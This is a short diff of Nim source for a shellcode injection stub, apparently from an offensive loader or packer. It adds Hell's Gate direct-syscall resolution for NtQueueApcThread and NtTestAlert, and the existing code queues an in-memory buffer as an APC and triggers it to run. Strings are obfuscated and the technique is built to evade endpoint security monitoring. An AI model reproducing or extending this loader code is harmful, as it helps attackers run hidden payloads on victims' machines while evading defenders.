@@ -155,16 +155,24 @@ let LocalInjectStub*  = """
 
         when defined(QueueAPC):
             var tHandle: HANDLE = -2
-            #when defined(Hellsgate):
-                # Todo
+            when defined(Hellsgate):
+                if getSyscall(ntQueueApcThreadTable):
+                    syscall = ntQueueApcThreadTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtQueueApcThread")
             
             let pfnAPC : PKNORMAL_ROUTINE = cast[PKNORMAL_ROUTINE](buffer)
             status = NtQueueApcThread(tHandle, pfnAPC, buffer, nil, nil)
             when defined(verbose):
                 echo obf("[*] NtQueueApcThread: "), toHex(status)
             
-            #when defined(Hellsgate):
-                # Todo
+            when defined(Hellsgate):
+                if getSyscall(ntTestAlertTable):
+                    syscall = ntTestAlertTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtTestAlert")
             
             status = NtTestAlert()
             when defined(verbose):
